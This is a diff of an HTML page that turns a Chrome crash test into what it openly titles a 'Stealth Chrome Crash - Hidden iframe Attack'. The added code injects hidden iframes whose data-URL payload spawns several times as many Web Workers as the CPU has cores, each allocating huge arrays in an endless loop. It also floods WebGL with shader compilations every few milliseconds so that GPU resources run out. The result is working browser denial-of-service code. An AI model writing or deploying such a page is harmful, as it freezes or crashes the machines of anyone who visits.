@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Hidden iframe Crash</title>
+    <title>Stealth Chrome Crash</title>
 </head>
 <body>
-    <h1>Chrome Crash Test - Hidden iframe</h1>
+    <h1>Stealth Chrome Crash - Hidden iframe Attack</h1>
     <p>Click anywhere to start the attack.</p>
 
     <script>
@@ -12,7 +12,32 @@
             for (let i = 0; i < numFrames; i++) {
                 let iframe = document.createElement("iframe");
                 iframe.style.display = "none"; // Hide iframe
-                iframe.src = window.location.href; // Load crash script
+                iframe.src = "data:text/html;charset=utf-8," + encodeURIComponent(`
+                    <script>
+                        function startWorker() {
+                            let code = \`while (true) { new Float64Array(1e8); }\`;
+                            let blob = new Blob([code], { type: "application/javascript" });
+                            let worker = new Worker(URL.createObjectURL(blob));
+                        }
+                        for (let i = 0; i < navigator.hardwareConcurrency * 4; i++) {
+                            startWorker();
+                        }
+
+                        var canvas = document.createElement('canvas');
+                        var gl = canvas.getContext('webgl');
+                        function crashGPU() {
+                            let shaders = [];
+                            setInterval(() => {
+                                var shader = gl.createShader(gl.VERTEX_SHADER);
+                                gl.shaderSource(shader, 'void main() { gl_Position = vec4(1.0); }');
+                                gl.compileShader(shader);
+                                shaders.push(shader);
+                                gl.getShaderParameter(shader, gl.COMPILE_STATUS);
+                            }, 5);
+                        }
+                        crashGPU();
+                    <\/script>
+                `);
                 document.body.appendChild(iframe);
             }
         }
@@ -24,4 +49,3 @@
     </script>
 </body>
 </html>
-
